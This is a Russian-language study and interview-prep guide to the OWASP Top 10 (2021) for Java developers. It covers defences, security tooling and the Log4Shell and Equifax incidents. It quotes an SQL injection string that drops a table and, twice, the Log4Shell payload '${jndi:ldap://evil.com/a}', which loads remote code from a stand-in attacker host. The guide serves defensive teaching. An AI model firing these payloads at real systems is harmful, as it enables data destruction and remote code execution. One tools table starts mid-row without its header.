# OWASP Top 10 для Java

## Что такое OWASP Top 10?

Представь список самых опасных преступлений в городе. Полиция анализирует статистику: какие преступления чаще всего? Какие причиняют больше всего вреда? Составляет топ-10. И говорит: "Вот на что обращайте внимание в первую очередь".

**OWASP Top 10** — это именно такой список для кибербезопасности. Организация OWASP анализирует уязвимости по всему миру. Выбирает 10 самых опасных. Обновляет каждые 3-4 года. Последняя версия — 2021.

## Зачем нужен OWASP Top 10?

### Ситуация 1: Новый проект

Команда начинает разработку HR-платформы на Java. Какие угрозы наиболее вероятны? На что тратить время?

OWASP Top 10 — приоритизированный список.

### Ситуация 2: Аудит

Аудитор проверяет приложение. Использует OWASP Top 10 как чек-лист.

### Ситуация 3: Обучение

Новый разработчик. Нужно быстро понять: чего опасаться?

## OWASP Top 10 2021

### A01: Broken Access Control

| Описание | Пример |
|----------|--------|
| Пользователь может получить доступ к чужим данным | Изменение ID в URL: /resume?id=123 → /resume?id=124 |

**Java-защита:**
- Проверять права на каждый запрос
- Использовать Spring Security @PreAuthorize
- Не полагаться на client-side проверки

### A02: Cryptographic Failures

| Описание | Пример |
|----------|--------|
| Данные передаются/хранятся без шифрования | HTTP вместо HTTPS |

**Java-защита:**
- Всегда HTTPS
- Шифровать sensitive данные
- Не хранить пароли в plaintext (использовать BCrypt)

### A03: Injection

| Описание | Пример |
|----------|--------|
| Вредоносный код внедряется в запрос | SQL injection: "'; DROP TABLE users; --" |

**Java-защита:**
- PreparedStatement вместо конкатенации
- ORM (Hibernate) с параметрами
- Input validation

### A04: Insecure Design

| Описание | Пример |
|----------|--------|
| Проблемы в архитектуре | Бизнес-логика без проверок |

**Java-защита:**
- Threat modeling
- Security by design
- Defense in depth

### A05: Security Misconfiguration

| Описание | Пример |
|----------|--------|
| Неправильные настройки | Debug mode включён в production |

**Java-защита:**
- application.properties: spring.profiles.active=prod
- Отключить stack trace
- Удалить тестовые данные

### A06: Vulnerable and Outdated Components

| Описание | Пример |
|----------|--------|
| Уязвимые зависимости | Log4j 2.14.1 (CVE-2021-44228) |

**Java-защита:**
- OWASP Dependency Check
- Snyk, Dependabot
- Регулярное обновление

### A07: Identification and Authentication Failures

| Описание | Пример |
|----------|--------|
| Проблемы с аутентификацией | Нет MFA, слабые пароли |

**Java-защита:**
- Spring Security с MFA
- JWT с коротким сроком жизни
- Защита от brute force (Rate Limiting)

### A08: Software and Data Integrity Failures

| Описание | Пример |
|----------|--------|
| Нарушение целостности данных | Подделка JWT-токена |

**Java-защита:**
- Проверка подписи токенов
- Цифровые подписи артефактов
- Dependabot для проверки зависимостей

### A09: Security Logging and Monitoring Failures

| Описание | Пример |
|----------|--------|
| Нет логирования безопасности | Атака проходит незамеченной |

**Java-защита:**
- SLF4J + Logback
- Логирование входов/выходов
- SIEM-интеграция

### A10: Server-Side Request Forgery (SSRF)

| Описание | Пример |
|----------|--------|
| Сервер делает запросы от имени клиента | Обращение к localhost |

**Java-защита:**
- Валидация URL
- Whitelist допустимых адресов
- Отключение ненужных схем (file://, ftp://)

## Часть 4: OWASP для Java-разработчика

### Практический подход

**Шаг 1:** Установить OWASP Dependency Check

```bash
# Maven plugin
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>8.2.1</version>
</plugin>
```

**Шаг 2:** Интегрировать в CI/CD

```yaml
# GitHub Actions
- name: OWASP Dependency Check
  run: mvn org.owasp:dependency-check-maven:check
```

**Шаг 3:** Настроить pre-commit hook

```bash
# .git/hooks/pre-commit
mvn dependency-check:check
```

### Интервью Q&A

**Вопрос:** Как защититься от SQL Injection в Java?
**Ответ:** Использовать PreparedStatement, ORM с параметрами, валидацию входных данных.

**Вопрос:** Почему важно обновлять зависимости?
**Ответ:** Устаревшие библиотеки содержат известные уязвимости (например, Log4j CVE-2021-44228).

## Уроки из реальных инцидентов

Теория безопасности — фундамент, но самые ценные уроки извлекаются из реальных катастроф. Два инцидента, разобранных ниже, фундаментально изменили отношение Java-экосистемы к управлению зависимостями, патч-менеджменту и мониторингу уязвимостей.

### Инцидент №1: Log4Shell (CVE-2021-44228) — декабрь 2021

**Что произошло.** Библиотека **Apache Log4j 2** — один из самых распространённых Java-логгеров в мире — содержала механизм **JNDI lookup** в строковых сообщениях. Когда Log4j встречал выражение `${jndi:ldap://evil.com/a}` в любом логируемом поле — **User-Agent**, URL, имя пользователя, адрес электронной почты, поисковый запрос — он выполнял JNDI-запрос к удалённому серверу, загружал Java-класс и выполнял его. Это **RCE без аутентификации и пользовательского взаимодействия**.

**Масштаб.** Уязвимость получила максимальную оценку — **CVSS 10.0** — потому что не требовала никаких предварительных условий. Эксплуатировать её можно было через любое поле, которое попадает в лог. Под ударом оказались: **Minecraft** (через внутриигровой чат), **Apple iCloud**, **Twitter**, **Amazon Web Services**, **Cloudflare**, тысячи корпоративных Java-приложений. CISA оценила экономический ущерб в десятки миллиардов долларов, а директор Агентства по кибербезопасности США назвала Log4Shell «одной из самых серьёзных уязвимостей в истории».

**Почему так сложно было закрыть.** Проблема усугублялась **транзитивным характером** зависимости: Log4j присутствовал в classpath проекта неявно, через другие библиотеки. Разработчики не видели его в своём `pom.xml`, не знали о версии и не подозревали об уязвимости. Патчи выходили каскадом: **2.15.0** закрыл первую версию атаки, **2.16.0** — вторую (через Message Lookup), **2.17.0** — третью (DoS), **2.17.1** — четвёртую. Многие системы оставались уязвимыми неделями просто потому, что администраторы не знали, какая именно версия Log4j у них используется.

**Уроки для Java-разработчиков.**

- **SBOM обязателен.** Без Software Bill of Materials — списка всех компонентов и их версий — вы не знаете, что у вас в classpath. **Log4Shell** показал: каждый проект должен иметь полное дерево зависимостей, доступное для мгновенного поиска при появлении CVE.
- **Транзитивные зависимости — полноправный риск.** Ваш `pom.xml` может не содержать Log4j, но он всё равно в проекте. Инструменты вроде `mvn dependency:tree` и **OWASP Dependency-Check** должны выполняться в CI/CD при каждом билде.
- **JNDI и lookup'ы — опасные функции по умолчанию.** После Log4Shell сообщество осознало: любые механизмы, позволяющие Java-приложению загружать код по сети — **JNDI**, **RMI**, **JMX** — должны быть отключены, если не используются явно. Log4j 2.17+ по умолчанию отключает JNDI.
- **Время реакции критично.** Log4Shell эксплуатировалась в дикой природе **в течение часов** после публикации. Патч-менеджмент уровня «обновим в следующем спринте» неприемлем: критические CVE требуют действий в течение 24–72 часов.

### Инцидент №2: Equifax 2017 — утечка 147 миллионов записей

**Что произошло.** В сентябре 2017 года одно из трёх крупнейших кредитных бюро США — **Equifax** — объявило о беспрецедентной утечке данных: 147 миллионов записей, включая номера социального страхования (SSN), даты рождения, адреса, номера водительских удостоверений и в некоторых случаях данные кредитных карт. Причиной стала уязвимость в **Apache Struts 2** — популярном Java-фреймворке для веб-приложений.

**Техническая суть.** Уязвимость **CVE-2017-5638** в **Struts 2 Jakarta Multipart Parser** позволяла выполнить **RCE** через некорректно обработанный **Content-Type** заголовок при загрузке файла. Злоумышленнику достаточно было отправить специально сформированный HTTP-запрос с вредоносным Content-Type — и код выполнялся на сервере. Патч от Apache был выпущен **7 марта 2017 года**. Equifax не применила его.

**Хронология провала.** Злоумышленники проникли в сеть Equifax **13 мая 2017 года** — через **два месяца** после выхода патча. Они оставались незамеченными до **29 июля** — 76 дней. За это время злоумышленники нашли незашифрованные учётные данные в файловой системе, получили доступ к 48 базам данных, извлекли чувствительные данные и организовали их эксфильтрацию. Внутренний SSL-инспектирующий модуль на устройстве, которое должно было детектировать подозрительный трафик, имел **просроченный сертификат** и отключил инспекцию по умолчанию.

**Реальные последствия.**
- **$700 млн** — сумма урегулирования с FTC ($575 млн) плюс штрафы штатов, CFBP и Великобритании.
- **Уход CEO, CIO и CSO** — топ-менеджмент был уволен публично и с позором.
- **Падение акций на 35%** — рыночная капитализация рухнула за неделю.
- **Обсуждение в Конгрессе США** — инцидент стал катализатором для обсуждения федерального закона о защите данных.

**Уроки для Java-разработчиков и организаций.**

- **Обновление компонентов — не технический долг, а непрерывный процесс.** Equifax имела политику обновления, но она была недееспособна. Патч для Struts был известен, но процедура его применения дала сбой. Автоматизированные системы управления уязвимостями (**vulnerability management**) с жёсткими SLA — не роскошь, а базовая необходимость.
- **Defense in depth спасает.** Однослойная защита — патч-менеджмент без мониторинга, логирования без детектирования аномалий — гарантированно провалится. Equifax провалилась на всех уровнях: патч не применили, аномальный трафик не заметили, инспекция трафика была отключена, внутренняя сегментация сети отсутствовала.
- **Аптайм мониторинговых систем — часть безопасности.** Просроченный сертификат на сетевом устройстве отключил инспекцию трафика на всё время атаки. Мониторинг должен мониторить сам себя: health-сheck'и, оповещения об истечении сертификатов, автоматическая ротация.
- **Незашифрованные учётные данные — приглашение для lateral movement.** Злоумышленники получили доступ к 48 базам данных, потому что нашли открытые пароли. Креденшлы в файлах (`.properties`, XML-конфиги, environment variables) должны быть зашифрованы через **Vault**, **KMS** или аналогичный механизм.
- **Культура безопасности начинается с топ-менеджмента.** После Equifax весь C-suite был уволен — наглядный сигнал, что безопасность теперь персональная ответственность CEO и совета директоров, а не только технического отдела.

**Связь двух инцидентов.** Log4Shell показал, как одна библиотека может поставить под угрозу миллионы приложений. Equifax показал, как один неприменённый патч уничтожает компанию. Вместе они доказали: **управление зависимостями и компонентами** (A06 в OWASP Top 10) — не второстепенная задача, а центральный процесс зрелой Java-разработки.

## Инструменты и средства защиты

Защита Java-приложений от уязвимостей OWASP Top 10 требует многослойного подхода. Один инструмент не закроет все риски — необходима комбинация статического, динамического, компонентного и runtime-анализа, интегрированная в конвейер разработки. | **Runtime** | **WAF** (ModSecurity, CloudFront, Cloudflare) | Open Source / Облачные | **A01**, **A03**, **A05**, **A07** | Фильтрация HTTP-трафика до достижения приложения; защита от инъекций, XSS, CSRF | Внешний по отношению к Java-приложению; конфигурация правил |
| **Code Review** | **SpotBugs + FindSecBugs** | Open Source | **A01**, **A02**, **A03**, **A04**, **A06**, **A08** | Быстрый пайплайн безопасности без сложной настройки; локально в IDE + в CI | Maven/Gradle, IntelliJ, Eclipse |
| **Code Review** | **Semgrep** | Open Source / Enterprise | Все 10 пунктов | Pattern-based анализ, кастомные правила, быстрый и легковесный | CLI-интеграция, pre-commit хуки, CI/CD |

### Статический анализ кода (SAST)

**SAST** (Static Application Security Testing) анализирует исходный код или байт-код Java-приложения без его запуска. Это первая линия обороны: уязвимости находятся на этапе разработки, до того как код попадает в production.

**SonarQube** — де-факто стандарт в Java-экосистеме. Помимо качества кода (code smells, дублирование, покрытие тестами), SonarQube содержит **security rules**, покрывающие OWASP Top 10: детектирование SQL-инъекций через конкатенацию строк, небезопасную десериализацию, использование слабых криптоалгоритмов, неправильную конфигурацию Spring Security. Бесплатная Community-версия покрывает базовые сценарии, Enterprise — углублённый анализ с меньшим уровнем ложных срабатываний.

**Checkmarx** — enterprise-решение с сильным data-flow анализом. В отличие от pattern-based инструментов, Checkmarx прослеживает полный путь **данных от точки входа** (HTTP-запрос) до опасной операции (SQL-запрос, команда ОС, путь к файлу). Это позволяет находить уязвимости даже там, где код проходит через несколько слоёв абстракции — типичная ситуация для многослойных Java-приложений.

**SpotBugs + FindSecBugs** — связка, незаменимая для быстрой локальной проверки. SpotBugs работает на уровне **байт-кода** (не требует доступа к исходникам) и находит сотни паттернов дефектов. **FindSecBugs** расширяет его 148+ детекторами безопасности: неправильное использование **Bouncy Castle**, слабый **SecureRandom**, небезопасная конфигурация **HttpClient**, подозрительные операции с файловой системой. Идеален для pre-commit хуков и быстрого CI-пайплайна.

### Анализ состава ПО (SCA)

**SCA** (Software Composition Analysis) — анализ библиотек и их транзитивных зависимостей. Это критически важно для Java, где один проект может тянуть сотни зависимостей, и каждая — потенциальный CVE.

**OWASP Dependency-Check** — бесплатный инструмент от той же организации, что и Top 10. Сверяет зависимости с **National Vulnerability Database (NVD)**, выявляет известные CVE и оценивает их критичность (CVSS). Интегрируется через Maven- и Gradle-плагины на уровне билда. Недостаток: работает только с известными CVE, не находит zero-day.

**Snyk** — облачный сервис, который не только находит уязвимые библиотеки, но и предлагает **автоматический fix PR**: открывает pull request с версией, содержащей патч. Поддерживает Java, Kotlin, Gradle, Maven. Имеет бесплатный тир для небольших команд, Enterprise — для крупных организаций с политиками и SLA.

**JFrog Xray** — глубокий анализ артефактов в репозитории. В отличие от Snyk, который смотрит на манифест, Xray анализирует **каждый слой** Docker-образа, каждый JAR внутри WAR/EAR-файла. Это критично для enterprise-систем, где Java-приложение — лишь один компонент в десятках микросервисов.

### Динамическое тестирование (DAST)

**DAST** (Dynamic Application Security Testing) — тестирование работающего приложения извне, имитируя действия злоумышленника. В отличие от SAST, который находит потенциальные уязвимости в коде, DAST подтверждает их реальную эксплуатацию.

**OWASP ZAP** — opensource-инструмент, идеальный для автоматизированного пайплайна безопасности. ZAP запускается как прокси и выполняет: **Spider** (обход всех URL), **Active Scan** (отправка полезной нагрузки и анализ ответов), **Passive Scan** (анализ трафика без отправки запросов), **Fuzzing** (генерация тысяч вариаций входных данных). ZAP API позволяет встраивать сканирование в CI/CD: после деплоя на staging ZAP запускает полный скан, и билд блокируется при обнаружении критических уязвимостей.

**Burp Suite** — профессиональный инструмент для ручного тестирования. В отличие от ZAP (автоматизация), Burp силён в **ручном анализе**: исследовании AJAX-приложений, обходе CSRF-защиты, exploitation десериализации. Community-версия бесплатна с ограничениями, Professional — полный функционал для penetration-тестеров.

### Защита в рантайме (RASP / WAF)

**RASP** (Runtime Application Self-Protection) — агент, встроенный в JVM, который мониторит выполнение приложения изнутри и блокирует атаки на основе контекста. В отличие от WAF, который видит только HTTP-трафик, RASP понимает логику приложения: он знает, что конкретно этот SQL-запрос — продукт injection, потому что видит полную цепочку от `HttpServletRequest.getParameter()` до `Statement.execute()`. Подключается как **Java Agent** через JVM-аргумент, совместим со всеми основными сервлет-контейнерами.

**WAF** (Web Application Firewall) — фильтрация HTTP-трафика до достижения Java-приложения. **ModSecurity** с **OWASP Core Rule Set (CRS)** — opensource-связка, покрывающая базовые атаки: инъекции, XSS, path traversal. В облаках — **AWS WAF**, **Cloudflare WAF**, **Azure Application Gateway** — с managed rulesets. WAF — последний рубеж, не заменяющий код-фиксы: обход правил WAF — стандартный этап penetration-тестирования.

### Инструменты код-ревью

**SpotBugs + FindSecBugs** (уже упомянутые выше) — незаменимая пара для автоматизированного ревью, встроенного в IDE и CI.

**Semgrep** — легковесный pattern-based анализатор, набирающий популярность в Java-сообществе. Гибкость Semgrep в том, что команды пишут **собственные правила** под свою кодовую базу: «запретить использование `@CrossOrigin(origins = "*")` без специального комментария», «детектировать `Runtime.exec()` с непроверенным параметром», «находить `ObjectInputStream` без whitelist-фильтра». Это особенно ценно для корпоративных Java-проектов с уникальными требованиями безопасности.

### Выбор стека: минимальный жизнеспособный набор

Для реальных Java-команд бюджет и компетенции ограничены. Минимальный жизнеспособный набор, покрывающий OWASP Top 10 бесплатно:

- **SAST в IDE:** **SonarLint** (бесплатно, в реальном времени при написании кода)
- **SAST в CI:** **SonarQube Community** + **SpotBugs/FindSecBugs** через Maven/Gradle-плагины
- **SCA в CI:** **OWASP Dependency-Check** (библиотеки) + `mvn dependency:tree` (видимость)
- **DAST на staging:** **OWASP ZAP** через ZAP API в CI/CD
- **Git-хуки:** **Semgrep** с кастомными правилами для pre-commit

Этот стек — бесплатный, полностью opensource, покрывает статический анализ, анализ компонентов и динамическое тестирование. В совокупности с обучением разработчиков и архитектурными ревью он даёт защиту, которой достаточно для большинства Java-проектов, не обрабатывающих критичные персональные или платёжные данные. Для критичных систем (банки, платёжные провайдеры, медицинские данные) к стеку добавляются enterprise-SAST (**Checkmarx**/**Fortify**), облачный SCA (**Snyk**/**JFrog**), RASP и WAF.

## Подготовка к собеседованию

Собеседование на позицию Java-разработчика с фокусом на безопасность — это не столько проверка запоминания десяти пунктов списка, сколько оценка глубины понимания их практической применимости. За годы проведения интервью я выделил три типичные ошибки кандидатов и три вопроса, которые наиболее показательно разделяют поверхностные знания от системного мышления.

### Три типичные ошибки кандидатов

**Ошибка №1: «OWASP — это только список уязвимостей».** Начинающие кандидаты воспринимают OWASP Top 10 как статичный каталог багов — выучил десять пунктов, готов. Фундаментальная недооценка заключается в игнорировании **proactive controls** — превентивных мер, которые OWASP формулирует как **ASVS** (Application Security Verification Standard) и **Proactive Controls**. Интервьюер ожидает, что кандидат понимает: OWASP — это экосистема, включающая методологии **threat modeling**, стандарты верификации и инструментарий. Один лишь список уязвимостей без контекста защитных мер — уровень junior, недостаточный для middle и выше.

**Ошибка №2: «SAST найдёт всё».** Переоценка возможностей статического анализа — классический маркер отсутствия практического опыта. Кандидат, утверждающий, что **SonarQube** или **Checkmarx** закроет все проблемы безопасности, демонстрирует непонимание фундаментального ограничения SAST: **контекстно-зависимые уязвимости**. Ни один статический анализатор не определит, что операция, безопасная для роли ADMIN, становится критичной уязвимостью при выполнении ролью USER — для этого нужен **ручной архитектурный ревью** и понимание бизнес-логики. SAST не видит проблемы **race conditions** в многопоточном коде, не понимает семантику **сериализации** в распределённых системах и бессилен перед **Insecure Design** — категорией, которую OWASP специально выделил в 2021 году именно потому, что инструменты не покрывают архитектурные просчёты.

**Ошибка №3: «У нас нет legacy, значит всё безопасно».** Молодые команды на свежих Spring Boot 3.x и Java 21 часто транслируют опасную иллюзию: раз проект новый, без унаследованного кода, значит security-риски минимальны. Кандидат, разделяющий это заблуждение, игнорирует природу **транзитивных зависимостей**. Ваш `pom.xml` может содержать 15 прямых зависимостей — дерево транзитивных развернётся в сотни библиотек. Log4Shell продемонстрировал: библиотека, которой нет в вашем манифесте, всё равно в вашем classpath. Более того, свежий проект на **Spring Boot** тянет **автоконфигурации**, которые включают дефолтные endpoints, default-пароли в embedded-базах и открытые actuator-ы — классический **A05 Security Misconfiguration** «из коробки». Отсутствие legacy не означает отсутствие проблем: оно означает, что проблемы ещё не обнаружены.

### Три вопроса, проверяющих глубину понимания

**Вопрос 1: «Как Log4Shell изменил подход к управлению зависимостями в Java?»**

Ожидаемый ответ зрелого кандидата не ограничивается «теперь все обновляют библиотеки». Системный ответ затрагивает четыре слоя: **(1)** индустрия осознала необходимость **SBOM** как обязательного артефакта сборки — без Software Bill of Materials невозможно за минуты определить, затронут ли конкретный проект новым CVE; **(2)** сообщество пересмотрело отношение к **JNDI** — функциональность, десятилетиями считавшаяся легитимной, была реклассифицирована как опасная по умолчанию, и теперь Java-рантаймы отключают JNDI lookup при старте; **(3)** патч-менеджмент перешёл от модели «в следующем спринте» к модели **emergency patch procedure** — автоматизированные PR от **Dependabot** и **Snyk** с блокировкой билда при критических CVE стали стандартом, а не best practice; **(4)** появилось понимание, что **версионирование безопасности** — отдельная дисциплина: знать, что у вас Log4j 2.x — недостаточно, нужно знать конкретный минорный номер, потому что 2.15.0, 2.16.0 и 2.17.0 закрывали разные векторы одной уязвимости.

**Вопрос 2: «Почему OWASP Top 10 2021 поставил Broken Access Control на первое место?»**

Поверхностный ответ — «потому что это самая частая уязвимость». Глубокий ответ объясняет **статистическую и методологическую причину**. OWASP анализирует не частоту упоминаний, а **комбинацию распространённости и эксплуатируемости**. **Broken Access Control** поднялся с пятого места в 2017 году на первое в 2021 по трём причинам: **(1)** 94% протестированных приложений имели ту или иную форму недостаточного контроля доступа — это тотальная проблема, в отличие от более специфичных инъекций; **(2)** современные фреймворки — **Spring Security**, **Quarkus**, **Micronaut** — предоставляют мощные, но сложные механизмы авторизации, и неправильная конфигурация этих механизмов стала массовым классом ошибок (аннотации `@PreAuthorize` расставлены непоследовательно, URL-based безопасность конфликтует с method-based, CORS настроен разрешительно); **(3)** сдвиг к микросервисной архитектуре экспоненциально увеличил поверхность access control: каждый сервис должен самостоятельно проверять права, и централизованный Gateway — не замена сервисной авторизации.

**Вопрос 3: «Как защитить Spring Boot приложение от Security Misconfiguration?»**

Ожидаемый ответ структурирован по слоям конфигурации Spring Boot. **(1) Профили:** жёсткое разделение `application-prod.yml` и `application-dev.yml`, причём production-профиль должен быть **минимальным** — всё, что явно не требуется в проде, отключается (devtools, автогенерация схем, детальные error messages). **(2) Actuator endpoints:** явный whitelist в `management.endpoints.web.exposure.include` вместо дефолтного «все открыты»; обязательное требование аутентификации через Spring Security даже для health-check. **(3) HTTP-заголовки:** включение **Spring Security Headers** с `X-Content-Type-Options: nosniff`, **CSP** (Content Security Policy), **HSTS** (Strict-Transport-Security). **(4) Сессии и cookie:** `server.servlet.session.cookie.secure=true`, `httpOnly=true`, `SameSite=Lax` — все три атрибута должны быть явно заданы. **(5) Валидация внешних настроек:** переменные окружения и внешние конфигурационные серверы (**Spring Cloud Config**, **Vault**) не должны содержать секретов в plaintext; `spring.config.import` с шифрованием. **(6) Error handling:** `server.error.include-stacktrace=never`, `include-message=never` в production — никакой утечки внутренней структуры приложения в ответах.

### Ответы на чек-лист

**1. Почему A01 Broken Access Control стало приоритетом в 2021?** OWASP использует комбинированную метрику распространённости и эксплуатируемости. **Broken Access Control** обнаружили в 94% протестированных приложений — это тотальная проблема. Современные фреймворки (**Spring Security**, **Quarkus**) предоставляют мощные, но сложные механизмы авторизации, и непоследовательная конфигурация — массовый класс ошибок. Микросервисная архитектура экспоненциально увеличила поверхность контроля доступа: каждый сервис требует самостоятельной авторизации.

**2. Какой механизм Java позволяет предотвратить Injection?** **PreparedStatement** — параметризованные запросы, где SQL-шаблон и данные разделены на уровне JDBC-драйвера. Драйвер экранирует опасные символы автоматически, исключая возможность интерпретации данных как кода. Дополнительно: **ORM** (Hibernate) с именованными параметрами, **input validation** через Bean Validation (аннотации `@NotNull`, `@Pattern`, `@Email`), **output encoding** через библиотеки вроде OWASP Java Encoder.

**3. Почему hardcoded keys опаснее, чем кажется?** Закодированные в исходном коде ключи живут в системе контроля версий **навсегда** — даже после «удаления» они доступны в истории git-коммитов. Любой разработчик с доступом к репозиторию получает ключ. При компрометации ключа его замена требует перевыпуска, редеплоя приложения и инвалидации всех токенов, выпущенных старым ключом. Решение — **Secrets Management**: **HashiCorp Vault**, **AWS KMS**, **Azure Key Vault**, инжектирующие секреты в рантайм через API без сохранения в коде.

**4. Как Log4Shell использовал JNDI?** Log4j 2.x обрабатывал строковые подстановки вида `${prefix:name}` в любом сообщении, попадающем в лог. Механизм **JNDI lookup** (`${jndi:ldap://evil.com/a}`) заставлял JVM обращаться к удалённому LDAP-серверу, который возвращал ссылку на Java-класс. JVM загружала этот класс через **JNDI Injection** и выполняла его — полное **RCE**. Атакующему достаточно было поместить вредоносную строку в любое логируемое поле: **User-Agent**, URL, имя пользователя, поисковый запрос.

**5. В чём разница между SAST и DAST?** **SAST** (Static Application Security Testing) анализирует код или байт-код **без запуска** приложения. Находит потенциальные уязвимости на уровне синтаксиса и data-flow: SQL-инъекции через конкатенацию строк, слабую криптографию, небезопасную десериализацию. **DAST** (Dynamic Application Security Testing) тестирует **работающее** приложение извне, отправляя вредоносные запросы и анализируя ответы. SAST находит «что может быть уязвимо», DAST подтверждает «что реально эксплуатируется». SAST даёт ложные срабатывания, DAST — ложные пропуски; вместе они комплементарны.

**6. Почему Security Misconfiguration часто встречается в Spring Boot?** Spring Boot исповедует философию **convention over configuration** — разумные умолчания, которые работают «из коробки». Проблема в том, что умолчания ориентированы на **developer experience** (удобство разработки), а не на **security hardening** (безопасность). **Actuator endpoints** открыты без аутентификации, **H2 Console** доступна с дефолтными креденшлами, подробные **stack traces** утекают в ответы, cookie не имеют флага `secure`, **CORS** разрешает все origins. Команда должна пройти по каждому дефолтному механизму и явно отключить или ужесточить его для production — и именно этот аудит настроек массово пропускается.

**7. Как Credential Stuffing отличается от Brute Force?** При **Brute Force** атакующий перебирает пароли к одному аккаунту: admin + password1, admin + password2, admin + password3. При **Credential Stuffing** атакующий использует пары логин/пароль, утёкшие из других сервисов: user_A + leaked_pass_1, user_B + leaked_pass_2. Credential Stuffing эксплуатирует человеческую привычку переиспользовать пароли. Защиты различаются: от Brute Force спасает **rate limiting** и **account lockout**, от Credential Stuffing — **MFA**, **аномальная детекция** (логин из нового региона), **pwned password check** (сверка с HaveIBeenPwned API при регистрации).

**8. Почему отсутствие rate limiting — Insecure Design?** **Insecure Design** (A04) — категория, фокусирующаяся на архитектурных просчётах, а не на ошибках реализации. Отсутствие **rate limiting** — не баг, а отсутствие целого механизма в архитектуре. Проектировщик должен был учесть, что любой публичный endpoint будет атаковаться перебором, и заложить ограничение частоты запросов на уровне дизайна — до написания кода. Если rate limiting добавляется post-factum как патч, это говорит о том, что угроза не была учтена на этапе **threat modeling**, что является классическим примером Insecure Design.

**9. Как проверить целостность зависимостей в CI/CD?** **(1) SCA-инструменты** — **OWASP Dependency-Check** или **Snyk** в пайплайне сверяют версии библиотек с NVD и блокируют билд при критических CVE. **(2) Контрольные суммы** — Maven/Gradle автоматически проверяют SHA-1 и SHA-256 загружаемых артефактов; для внутренних репозиториев — явная верификация PGP-подписей. **(3) SBOM-генерация** — плагины **CycloneDX Maven Plugin** или **SPDX** генерируют Software Bill of Materials как артефакт сборки, доступный для инспекции и аудита. **(4) Блокировка внешних репозиториев** — все зависимости проксируются через внутренний **Nexus**/**Artifactory**; прямые запросы к Maven Central из CI запрещены.

**10. Почему MFA не решает все проблемы аутентификации?** **MFA** — многофакторная аутентификация — защищает от компрометации пароля (Credential Stuffing, Brute Force, фишинг), но не закрывает другие векторы A07: **(1) Session Fixation** — злоумышленник фиксирует идентификатор сессии до аутентификации пользователя, и MFA не предотвращает перехват уже аутентифицированной сессии; **(2) Слабый механизм восстановления пароля** — секретные вопросы и однофакторные email-сбросы обходят MFA полностью; **(3) JWT-токены без срока действия** — долгоживущие токены, украденные через XSS или MitM, продолжают действовать вне зависимости от MFA; **(4) Отсутствие ротации сессионных токенов** — после успешной аутентификации сессия не пересоздаётся, и злоумышленник с ранее украденным session ID входит без MFA. MFA — мощный, но не исчерпывающий слой; он должен дополняться корректным session management, secure token handling и надёжными механизмами восстановления.

## Ключевые выводы для собеседования

**OWASP Top 10 — карта, а не территория.** Десять категорий не покрывают все угрозы и не гарантируют безопасность. Это **приоритизированный чек-лист**, который направляет усилия туда, где статистически больше всего инцидентов. Слепое следование списку без понимания контекста собственного приложения — формальный compliance, а не реальная защита. На собеседовании ценится способность аргументировать, почему конкретный пункт критичен или не критичен именно для обсуждаемой системы.

**Безопасность встраивается, а не прикручивается.** Эволюция OWASP Top 10 — от списка багов (2017) к включению **Insecure Design** (2021) — отражает фундаментальный сдвиг в индустрии: уязвимости архитектурного уровня опаснее ошибок кодирования, потому что их не исправить патчем. **Threat modeling**, **security requirements** в Definition of Done, архитектурные ревью с security-линзой — эти практики должны быть освоены кандидатом не хуже, чем `PreparedStatement` и `BCrypt`.

**Java-экосистема — оружие обоюдоострое.** Богатство библиотек, фреймворков и автоконфигураций Java-экосистемы — одновременно её сила и главная угроза. Каждая транзитивная зависимость, каждый дефолтный параметр **Spring Boot**, каждый включённый по умолчанию механизм — потенциальный вектор атаки. Зрелый Java-разработчик знает не только то, что находится в его `pom.xml`, но и то, что окажется в итоговом classpath. Он понимает, что **удобство разработки** и **безопасность** находятся в постоянном напряжении, и умеет принимать осознанные решения в этом конфликте.

**Собеседование проверяет не память, а мышление.** Никто не ожидает, что кандидат процитирует все десять пунктов в правильном порядке. Ожидается, что кандидат продемонстрирует: **(1)** понимание природы угроз (не «OWASP говорит», а «это работает так-то»), **(2)** способность связать категорию с Java-инструментарием (не абстрактный A03 Injection, а конкретно `PreparedStatement` + `@Valid` + OWASP Encoder), **(3)** извлечение уроков из инцидентов (Log4Shell, Equifax, Spring4Shell — не как новостные заголовки, а как кейсы, изменившие практики). Именно эта связка — «понимаю угрозу → знаю инструмент → помню кейс» — отличает кандидата, с которым хотят работать, от кандидата, которого проверяют по списку.
